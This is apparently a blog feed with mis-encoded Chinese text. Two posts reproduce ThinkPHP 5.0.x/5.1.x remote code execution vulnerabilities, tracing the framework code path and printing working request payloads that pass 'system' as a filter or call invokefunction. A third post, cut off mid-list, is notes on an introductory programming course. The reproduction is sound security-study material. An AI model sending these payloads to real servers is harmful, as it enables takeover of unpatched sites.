        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-0-0-5-0-23-RCE-æ¼æ´å¤ç°"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-æ¼æ´å¤ç°" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE æ¼æ´å¤ç°"></a>ThinkPHP 5.0.0~5.0.23 RCE æ¼æ´å¤ç°</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p> ThinkPHP 5.0.0~5.0.23 </p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code>http://127.0.0.1/index.php?s=captchapost_ex1ï¼š_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoamipost_exp2ï¼š_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="è¿‡ç¨‹å¤ç°-exp1"><a href="#è¿‡ç¨‹å¤ç°-exp1" class="headerlink" title="è¿‡ç¨‹å¤ç°(exp1)"></a>è¿‡ç¨‹å¤ç°(exp1)</h2><p> ä»¥ thinkphp 5.0.22 å®Œæ•´ç‰ˆä¸ºå¤ç°ç¯å¢ƒ(ä¸ºå•¥è¦å®Œæ•´ç‰ˆç­‰ä¼šè¯´)ï¼Œä¸‹è½½åœ°å€ï¼š<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a> </p><p> å®˜æ–¹è¡¥ä¸åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p><p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p><p>å…¶ä¸­<code>$this-&gt;{$this-&gt;method}($_POST);</code>å¯ä»¥æ‰§è¡Œä»»æ„æ¥å—ä¸€ä¸ªæ•°ç»„çš„requestæ–¹æ³•,<code>$this-&gt;method</code>å¯ä»¥é€šè¿‡æ§åˆ¶<code>$_POST[&#39;_method&#39;]</code>æ¥æ§åˆ¶</p><p>æŸ¥æ‰¾ç›¸å…³æ–¹æ³•åé€‰å®š<code>__construct</code>æ¥ä¿®æ”¹requestå±æ€§å†ç»“åˆå…¶ä»–æ–¹æ³•å½¢æˆåˆ©ç”¨é“¾</p><pre><code class="php">protected function __construct($options = [])    {        foreach ($options as $name =&gt; $item) {            if (property_exists($this, $name)) {                $this-&gt;$name = $item;            }        }        if (is_null($this-&gt;filter)) {            $this-&gt;filter = Config::get(&#39;default_filter&#39;);        }        // ä¿å­˜ php://input        $this-&gt;input = file_get_contents(&#39;php://input&#39;);    }</code></pre><p>æŸ¥æ‰¾requestä¸­å¯èƒ½å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•æ—¶å‘ç°,input()æ–¹æ³•å¯ä»¥é€šè¿‡ä¿®æ”¹filteræ¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ...        // è§£æè¿‡æ»¤å™¨        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);//å‘½ä»¤æ‰§è¡Œ            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }        ...    }</code></pre><p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p><p>æ¥ç€æŸ¥æ‰¾è°ƒç”¨method()çš„åœ°æ–¹,ä¸‹æ–­ç‚¹</p><p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p><p>ä»å…¥å£ç‚¹App.phpå¼€å§‹æŸ¥çœ‹å¯èƒ½ä½œä¸ºæ”»å‡»é“¾ä¸€éƒ¨åˆ†çš„åœ°æ–¹</p><p>èŠ‚é€‰App.phpå…³é”®å†…å®¹</p><pre><code class="php">public static function run(Request $request = null)    {        $request = is_null($request) ? Request::instance() : $request;        try {            ...            // è·å–åº”ç”¨è°ƒåº¦ä¿¡æ¯            $dispatch = self::$dispatch;            // æœªè®¾ç½®è°ƒåº¦ä¿¡æ¯åˆ™è¿›è¡Œ URL è·¯ç”±æ£€æµ‹            if (empty($dispatch)) {                $dispatch = self::routeCheck($request, $config);            }            // è®°å½•å½“å‰è°ƒåº¦ä¿¡æ¯            $request-&gt;dispatch($dispatch);            // è®°å½•è·¯ç”±å’Œè¯·æ±‚ä¿¡æ¯            ...            $data = self::exec($dispatch, $config);        } catch (HttpResponseException $exception) {            $data = $exception-&gt;getResponse();        }        ...    }</code></pre><p>è·Ÿè¿›routeCheck</p><pre><code class="php">public static function routeCheck($request, array $config)    {        $path   = $request-&gt;path();        $depr   = $config[&#39;pathinfo_depr&#39;];        $result = false;        // è·¯ç”±æ£€æµ‹        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];        if ($check) {            ...            $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);            ...        }        ...        return $result;    }</code></pre><p>è·Ÿè¿›check,åœ¨è·å–methodæ—¶è°ƒç”¨äº†methodæ–¹æ³•</p><pre><code class="php">public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)    {        //æ£€æŸ¥è§£æç¼“å­˜        ...        $method = strtolower($request-&gt;method());        // è·å–å½“å‰è¯·æ±‚ç±»å‹çš„è·¯ç”±è§„åˆ™       ...    }</code></pre><p>è¿”å›App.php,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ•æ„Ÿçš„å‡½æ•°<code>$data = self::exec($dispatch, $config);</code></p><p>è·Ÿè¿›execç§ä¸€ç§</p><pre><code class="php">protected static function exec($dispatch, $config)    {        switch ($dispatch[&#39;type&#39;]) {            case &#39;redirect&#39;: // é‡å®šå‘è·³è½¬                $data = Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)                    -&gt;code($dispatch[&#39;status&#39;]);                break;            case &#39;module&#39;: // æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ                $data = self::module(                    $dispatch[&#39;module&#39;],                    $config,                    isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null                );                break;            case &#39;controller&#39;: // æ‰§è¡Œæ§åˆ¶å™¨æ“ä½œ                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = Loader::action(                    $dispatch[&#39;controller&#39;],                    $vars,                    $config[&#39;url_controller_layer&#39;],                    $config[&#39;controller_suffix&#39;]                );                break;            case &#39;method&#39;: // å›è°ƒæ–¹æ³•                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);                break;            case &#39;function&#39;: // é—­åŒ…                $data = self::invokeFunction($dispatch[&#39;function&#39;]);                break;            case &#39;response&#39;: // Response å®ä¾‹                $data = $dispatch[&#39;response&#39;];                break;            default:                throw new \InvalidArgumentException(&#39;dispatch type not support&#39;);        }        return $data;    }</code></pre><p>å¦‚æœ<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>æ—¶ä¼šè°ƒç”¨<code>Request::instance()-&gt;param()</code></p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;mergeParam)) {            $method = $this-&gt;method(true);            // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡            ...            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    }</code></pre><p>è€Œparamåˆ™ä¼šè°ƒç”¨inputä»è€Œå½¢æˆå®Œæ•´çš„æ”»å‡»é“¾,å…¶ä¸­<code>$filter</code>æ—¶æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤,<code>$this-&gt;param</code>åˆ™æ˜¯å‚æ•°,</p><p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p><p>ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥é€šè¿‡ä¿®æ”¹<code>__construct</code>æ¥ä¿®æ”¹param,å› ä¸ºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­<code>$this-&gt;param</code>ä¼šè¢«è¦†ç›–,ä½†æ˜¯<code>$this-&gt;get</code>å´ä¸ä¼š,äºæ˜¯æˆ‘ä»¬éœ€è¦è¦†ç›–<code>$this-&gt;filter</code>å’Œ<code>$this-&gt;get</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è®©<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>çš„é—®é¢˜äº†</p><p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p><p>è¿™ä¹Ÿæ˜¯ä¸ºå•¥è¦tpå®Œæ•´ç‰ˆçš„åŸå› ,å®Œæ•´ç‰ˆé‡Œæ‰æœ‰captchaæ¨¡å—</p><blockquote><p>æ³¨æ„æˆ‘ä»¬è¯·æ±‚çš„è·¯ç”±æ˜¯<code>?s=captcha</code>ï¼Œå®ƒå¯¹åº”çš„æ³¨å†Œè§„åˆ™ä¸º<code>\think\Route::get</code>ã€‚åœ¨<code>method</code>æ–¹æ³•ç»“æŸåï¼Œè¿”å›çš„<code>$this-&gt;method</code>å€¼åº”ä¸º<code>get</code>è¿™æ ·æ‰èƒ½ä¸å‡ºé”™ï¼Œæ‰€ä»¥payloadä¸­æœ‰ä¸ª<code>method=get</code> </p></blockquote><p>äºæ˜¯æœ€åçš„payloadæ˜¯</p><pre><code>http://127.0.0.1/index.php?s=captcha_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="è¿‡ç¨‹å¤ç°-exp2"><a href="#è¿‡ç¨‹å¤ç°-exp2" class="headerlink" title="è¿‡ç¨‹å¤ç°(exp2)"></a>è¿‡ç¨‹å¤ç°(exp2)</h2><p>æ”»å‡»é“¾çš„å‰é¢åŸºæœ¬ç›¸åŒ,åªæœ‰è°ƒç”¨<code>Request::input</code>æ–¹æ³•çš„åœ°æ–¹ä¸åŒè€Œè¿›å…¥ä¸åŒåˆ†æ”¯</p><p>æˆ‘ä»¬çœ‹åˆ°<code>Request::param</code>æ–¹æ³•</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;mergeParam)) {            $method = $this-&gt;method(true);            // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡            ...            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    }</code></pre><p>æ³¨æ„è¿™ä¸€ä¸ª<code>$this-&gt;method(true);</code></p><p><code>Request::method</code></p><pre><code class="php">    public function method($method = false)    {        if (true === $method) {            // è·å–åŸå§‹è¯·æ±‚ç±»å‹            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        }         ...    }</code></pre><p>å®ƒä¼šè°ƒç”¨<code>Request::server</code>,è€Œè¿™ä¸ªæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨<code>Request::input</code></p><pre><code class="php">public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;server)) {            $this-&gt;server = $_SERVER;        }        if (is_array($name)) {            return $this-&gt;server = array_merge($this-&gt;server, $name);        }        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);    }</code></pre><p>ç»§ç»­åˆ†æä»£ç å‘ç°,rceçš„å‚æ•°å˜ä¸ºäº†<code>$this-&gt;server[&#39;REQUEST_METHOD&#39;]</code></p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (&#39;&#39; != $name) {            // è§£æname            if (strpos($name, &#39;/&#39;)) {                list($name, $type) = explode(&#39;/&#39;, $name);            } else {                $type = &#39;s&#39;;            }            // æŒ‰.æ‹†åˆ†æˆå¤šç»´æ•°ç»„è¿›è¡Œåˆ¤æ–­            foreach (explode(&#39;.&#39;, $name) as $val) {                if (isset($data[$val])) {                    $data = $data[$val];                } else {                    // æ— è¾“å…¥æ•°æ®ï¼Œè¿”å›é»˜è®¤å€¼                    return $default;                }            }            if (is_object($data)) {                return $data;            }        }        // è§£æè¿‡æ»¤å™¨        $filter = $this-&gt;getFilter($filter, $default);        ...        return $data;    }</code></pre><p>äºæ˜¯æœ‰</p><pre><code class="php">http://127.0.0.1/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="[https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-æ¼æ´åˆ†æ/)">Smi1e â€”- ThinkPHP 5.0.0~5.0.23 RCE æ¼æ´åˆ†æ</a></p><p> <a href="https://xz.aliyun.com/t/3845#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-2</a> </p><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.0.0<del>5.0.23 RCE æ¼æ´å¤ç°/](<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.0.0</del>5.0.23 RCE æ¼æ´å¤ç°/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tp5rceå¤ç°</title>
      <link href="/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="tp5rceå¤ç°"><a href="#tp5rceå¤ç°" class="headerlink" title="tp5rceå¤ç°"></a>tp5rceå¤ç°</h1><h2 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h2><blockquote><h3 id="æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬5-0-23å’Œ5-1-31ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚"><a href="#æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬5-0-23å’Œ5-1-31ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚" class="headerlink" title="æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬5.0.23å’Œ5.1.31ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚"></a>æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬5.0.23å’Œ5.1.31ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚</h3><p><strong>å¦‚æœæš‚æ—¶æ— æ³•æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œè¯·å¼€å¯å¼ºåˆ¶è·¯ç”±å¹¶æ·»åŠ ç›¸åº”æœªå®šä¹‰è·¯ç”±ï¼Œæˆ–è€…å‚è€ƒcommitçš„ä¿®æ”¹ å¢åŠ ç›¸å…³ä»£ç ã€‚</strong></p><p>â€“æ¥è‡ªthinkphpå®˜ç½‘</p></blockquote><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æ ¹æ®å®˜æ–¹çš„å…¬å‘Šå»å¯»æ‰¾ç›¸å…³commitå‘ç°æ¼æ´ä½ç½®</p><p><img src="https://i.loli.net/2020/01/28/5EDWfFXvmqSuJk3.png" alt="image302"></p><p>æŸ¥çœ‹æ‰€æœ‰è°ƒç”¨controllerçš„å‡½æ•°å‘ç°æœ‰ä¸ªæ•æ„Ÿçš„å‡½æ•°åexec,ä¸è¿‡è¿™ä¸ªæ˜¯tpè‡ªå·±å®ç°çš„</p><pre><code class="php">    public function exec()    {        // ç›‘å¬module_init        $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;module_init&#39;);        try {            // å®ä¾‹åŒ–æ§åˆ¶å™¨            $instance = $this-&gt;app-&gt;controller($this-&gt;controller,                $this-&gt;rule-&gt;getConfig(&#39;url_controller_layer&#39;),                $this-&gt;rule-&gt;getConfig(&#39;controller_suffix&#39;),                $this-&gt;rule-&gt;getConfig(&#39;empty_controller&#39;));            if ($instance instanceof Controller) {                $instance-&gt;registerMiddleware();            }        } catch (ClassNotFoundException $e) {            throw new HttpException(404, &#39;controller not exists:&#39; . $e-&gt;getClass());        }    ...    }</code></pre><p>è·Ÿè¿›controller</p><pre><code class="php">    public function controller($name, $layer = &#39;controller&#39;, $appendSuffix = false, $empty = &#39;&#39;)    {        list($module, $class) = $this-&gt;parseModuleAndClass($name, $layer, $appendSuffix);        if (class_exists($class)) {            return $this-&gt;__get($class);        } elseif ($empty &amp;&amp; class_exists($emptyClass = $this-&gt;parseClass($module, $layer, $empty, $appendSuffix))) {            return $this-&gt;__get($emptyClass);        }        throw new ClassNotFoundException(&#39;class not exists:&#39; . $class, $class);    }</code></pre><p>å†è·Ÿè¿›parseModuleAndClass</p><pre><code class="php">protected function parseModuleAndClass($name, $layer, $appendSuffix)    {        if (false !== strpos($name, &#39;\\&#39;)) {            $class  = $name;//å­˜åœ¨\            $module = $this-&gt;request-&gt;module();        } else {            if (strpos($name, &#39;/&#39;)) {                list($module, $name) = explode(&#39;/&#39;, $name, 2);            } else {                $module = $this-&gt;request-&gt;module();            }            $class = $this-&gt;parseClass($module, $layer, $name, $appendSuffix);        }        return [$module, $class];    }</code></pre><p>å¦‚æœå­˜åœ¨\åˆ™ç›´æ¥è¿”å›æ•°æ®,å…¶ä¸­<code>$name</code>æ˜¯æˆ‘ä»¬å¯æ§å†…å®¹,è€Œ<code>$name</code>ä¹Ÿæ°å¥½æ˜¯ç±»å,äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨å‘½åç©ºé—´\ç±»æ¥è¿›è¡Œæ•æ„Ÿæ“ä½œ</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æŸ¥æ‰¾æ‰‹å†Œ,æ‰¾åˆ°urlè®¿é—®çš„å…·ä½“ç»†èŠ‚</p><p><code>http://serverName/index.phpï¼ˆæˆ–è€…å…¶å®ƒåº”ç”¨å…¥å£æ–‡ä»¶ï¼‰?s=/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...]</code></p><p>äºæ˜¯æœ‰é€šæ€tp5.0.xå’Œtp5.1.xçš„æ£€æµ‹payload</p><p><code>http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=checktp5rce</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/01/28/tp5rceå¤ç°/">https://explorersss.github.io/2020/01/28/tp5rceå¤ç°/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>coursera-æœå…‹å¤§å­¦ ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨</title>
      <link href="/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/"/>
      <url>/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="coursera-æœå…‹å¤§å­¦-ç¨‹åºè®¾è®¡ä¸-Web-å…¥é—¨"><a href="#coursera-æœå…‹å¤§å­¦-ç¨‹åºè®¾è®¡ä¸-Web-å…¥é—¨" class="headerlink" title="coursera-æœå…‹å¤§å­¦ ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨"></a>coursera-æœå…‹å¤§å­¦ ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨</h1><h2 id="åœ¨courseraä¸Šå­¦ä¹ çš„æ„Ÿå—"><a href="#åœ¨courseraä¸Šå­¦ä¹ çš„æ„Ÿå—" class="headerlink" title="åœ¨courseraä¸Šå­¦ä¹ çš„æ„Ÿå—"></a>åœ¨courseraä¸Šå­¦ä¹ çš„æ„Ÿå—</h2><p>æˆ‘è§‰å¾—æœ€å¤§çš„ä¼˜ç‚¹æ˜¯:æ•™å­¦å’Œç»ƒä¹ åŒæ—¶è¿›è¡Œ,æå¤§çš„å¸®åŠ©äº†æˆ‘å¿«é€ŸæŒæ¡çŸ¥è¯†,è¿™æ˜¯æˆ‘æœ€å–œæ¬¢çš„ä¸€ç‚¹.ä½†æ˜¯å¯¹äºä¸­å›½å¢ƒå†…çš„è§†é¢‘ åŠ è½½æœ‰ç‚¹éš¾å—,ä¸è¿‡å¯ä»¥é€šè¿‡ä¿®æ”¹hostsæ¥æ”¹å–„.</p><p>è™½ç„¶è¿™ç§æ•™å­¦æ–¹å¼æˆ‘å¾ˆå–œæ¬¢,ä½†æ˜¯ç”±äºæˆ‘çš„è¯¾ç¨‹é€‰æ‹©ä¸å¤ªé€‚åˆæˆ‘è‡ªå·±(å¤ªåŸºç¡€äº†),å¯¼è‡´æˆ‘å…¶å®æ²¡å­¦åˆ°å•¥,ä½†æ˜¯æˆ‘è¿˜æ˜¯ç¡¬ç€å¤´çš®çœ‹å®Œäº†(é—²å¾—æ— èŠ?),é€‰æ‹©é€‚åˆè‡ªå·±çš„è¯¾ç¨‹çœŸçš„ç‰¹åˆ«é‡è¦</p><h2 id="æé—®é—®é¢˜çš„æ³¨æ„äº‹é¡¹"><a href="#æé—®é—®é¢˜çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="æé—®é—®é¢˜çš„æ³¨æ„äº‹é¡¹"></a>æé—®é—®é¢˜çš„æ³¨æ„äº‹é¡¹</h2><p><strong>è¯¦ç»†</strong>,<strong>æ¸…æ¥š</strong>çš„æè¿°è‡ªå·±é‡åˆ°çš„é—®é¢˜,åŠè‡ªå·±å°è¯•è§£å†³é—®é¢˜çš„ç»“æœ</p><h2 id="cssè¯­æ³•"><a href="#cssè¯­æ³•" class="headerlink" title="cssè¯­æ³•"></a>cssè¯­æ³•</h2><pre><code class="css">.classname{    preperty:value;}#ID{    preperty:value;}tagname {    preperty:value;};ortag1 tag2 {    preperty:value;};è¿™ä¸ªä¼šä¿®æ”¹tag1ä¸‹çš„tag2</code></pre><h2 id="cssèµ„æ–™"><a href="#cssèµ„æ–™" class="headerlink" title="cssèµ„æ–™"></a>cssèµ„æ–™</h2><h3 id="æ–‡æ¡£"><a href="#æ–‡æ¡£" class="headerlink" title="æ–‡æ¡£"></a>æ–‡æ¡£</h3><p> <a href="https://www.w3schools.com/css/css_border.asp" target="_blank" rel="noopener">https://www.w3schools.com/css/css_border.asp</a> </p><h3 id="css-colors"><a href="#css-colors" class="headerlink" title="css colors"></a>css colors</h3><p> <a href="https://www.w3schools.com/cssref/css_colors.asp" target="_blank" rel="noopener">https://www.w3schools.com/cssref/css_colors.asp</a> </p><p> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool</a></p><p> <a href="http://www.w3schools.com/colors/colors_picker.asp" target="_blank" rel="noopener">http://www.w3schools.com/colors/colors_picker.asp</a></p><h2 id="ç”¨ç¼–ç¨‹è§£å†³é—®é¢˜çš„ä¸ƒæ­¥éª¤"><a href="#ç”¨ç¼–ç¨‹è§£å†³é—®é¢˜çš„ä¸ƒæ­¥éª¤" class="headerlink" title="ç”¨ç¼–ç¨‹è§£å†³é—®é¢˜çš„ä¸ƒæ­¥éª¤"></a>ç”¨ç¼–ç¨‹è§£å†³é—®é¢˜çš„ä¸ƒæ­¥éª¤</h2><ol><li>Work example by hand.<br>æ¸…æ™°çš„è®¤è¯†è¦è§£å†³çš„é—®é¢˜,å¹¶æ‰‹åŠ¨å°è¯•è§£å†³</li><li>Write down what you did.<br>å†™ä¸‹è‡ªå·±è§£å†³é—®é¢˜çš„è¿‡ç¨‹(åªé’ˆå¯¹è¿™ä¸ªå…·ä½“çš„ä¾‹å­),ä¸è¦å¿½ç•¥æˆ‘ä»¬ç†æ‰€å½“ç„¶çš„ä¸œè¥¿,è®¡ç®—æœºä¸ä¼šè¿™ä¹ˆæƒ³,æˆ‘ä»¬è¦å°½å¯èƒ½çš„è¯¦ç»†,ç²¾ç¡®çš„è®°å½•æˆ‘ä»¬è§£å†³é—®é¢˜çš„æ­¥éª¤</li><li>Find patterns.<br>å°†è¿‡ç¨‹æŠ½è±¡æˆè§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€èˆ¬æ€§æ­¥éª¤,æ³¨æ„é‡å¤çš„æ­¥éª¤(å˜ä¸ºå¾ªç¯è¯­å¥),æ³¨æ„åˆ¤æ–­(å˜ä¸ºæ¡ä»¶è¯­å¥)</li><li>Check by 